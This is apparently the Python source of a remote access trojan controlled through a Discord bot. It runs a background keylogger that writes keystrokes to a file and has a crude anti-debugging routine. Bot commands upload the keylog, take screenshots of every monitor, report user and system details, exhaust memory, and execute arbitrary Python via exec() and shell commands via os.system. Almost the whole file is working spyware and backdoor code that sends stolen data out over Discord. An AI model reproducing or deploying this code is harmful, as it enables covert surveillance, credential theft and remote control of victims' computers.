import discord 
from pynput import keyboard
import threading
import ctypes
import os
import getpass
import platform
from mss import mss
from PIL import Image
import random
import psutil as ps
alloc = []

#wont work on stealth debugger
#ps. the best antidebugger ever made no cap
def debugger():
    isTrue = True
    while isTrue:
        if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
            try:
                womp = "a" * (1024 * 1024 * 10)
                alloc.append(womp)
            except Exception as e:
                pass
            isTrue = False

def press():
    os.makedirs("C:\\S2", exist_ok=True)
    def Testing(key):
        with open("C:\\S2\\test.txt", "a") as f:
            f.write(str(key))
    with keyboard.Listener(on_press=Testing) as listener:
        listener.join()

def getMss():
    os.makedirs("C:\\S2", exist_ok=True)
    n = random.randint(1000, 100000)
    path = f"C:\\S2\\screen-{n}.png"
    with mss() as sct:
        mon = sct.monitors[1:]
        imgs = [sct.grab(m) for m in mon]
        widths = [img.width for img in imgs]
        heights = [img.height for img in imgs]
        tW,tH = sum(widths), max(heights)
        comb = Image.new("RGB", (tW,tH))
        xOff = 0
        for img in imgs:
            im = Image.frombytes("RGB", img.size,img.rgb)
            comb.paste(im, (xOff,0))
            xOff += img.width
        comb.save(path)
    return path

def proc_l():
    # https://github.com/DarioStar999/System-Monitor-CLI-Tool/blob/main/main.py
    # '\n'.join([f"PID: {proc.info['pid']}, Name: {proc.info['name']}, CPU: {proc.info['cpu_percent']}%, Memory: {proc.info['memory_percent']}%" for proc in ps.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])])
    os.makedirs("C:\\S2", exist_ok=True)
    path = "C:\\S2\\tits.txt"
    with open(path, "a") as f:
        f.write('\n'.join([f"PID: {proc.info['pid']}, Name: {proc.info['name']}, CPU: {proc.info['cpu_percent']}%, Memory: {proc.info['memory_percent']}%"for proc in ps.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])]))
    return path

debbuger_thread = threading.Thread(target=debugger, daemon=True)
logger_thread = threading.Thread(target=press, daemon=True)
logger_thread.start()
debbuger_thread.start()

class BotClient(discord.Client):
    async def on_message(self, message):
        if message.content.startswith('!exc'):
            splitted = message.content.split("-")
            try:
                if splitted[1].startswith("ramfucker"):
                    size_str = splitted[2]
                    size = int(size_str)
                    try:
                        s = bytearray(size)
                        alloc.append(s)
                        await message.channel.send(f"Allocated {size_str} bytes (~{size/(1024**3):.2f} GB)")
                    except MemoryError:
                        await message.channel.send(f"Not enough memory to allocate that size!")
                else:
                    exec(splitted[1])
            except Exception as e:
                    await message.channel.send(f"Error: {e}")
        if message.content.startswith("!getkey"):
            await message.channel.send(file=discord.File("C:\\S2\\test.txt"))
        if message.content.startswith("!sysInfo"):
            UserName = getpass.getuser()
            HomeUser = os.path.expanduser("~")
            PlatMach = platform.machine()
            PlatPlat = platform.platform()
            platSys = platform.system()
            platProcs = platform.processor()
            await message.channel.send(f"UserName: {UserName}\nPathHome: {HomeUser}\nMachine: {PlatMach}\nPlatform: {PlatPlat}\nSystem: {platSys}\nProcessor: {platProcs}")
        if message.content.startswith("!osExec"):
            splitted = message.content.split("-")
            try:
                os.system(f"{splitted[1]}")
            except Exception as e:
                await message.channel.send(f"Error: {e}")
        if message.content.startswith("!sc"):
            path = getMss()
            await message.channel.send(file=discord.File(path))
        if message.content.startswith("!getPcUsage"):
            path = proc_l()
            await message.channel.send(content= f"CPU Usage: {ps.cpu_percent}\nMemory Usage: {ps.virtual_memory().percent}\nDisk Usage: {ps.disk_usage('/')}",file=discord.File(path))
        if message.content.startswith("!help"):
             await message.channel.send("Available commands:\nexc: !exc-ramfucker-5368709120 or !exc -print()\n!getkey - GetEveryKeyUsedOnComputer\n!sysInfo\n!osExec\n!sc (screenshots)\n!getPcUsage")

intents = discord.Intents.default()
intents.message_content = True

client = BotClient(intents=intents)

client.run('')
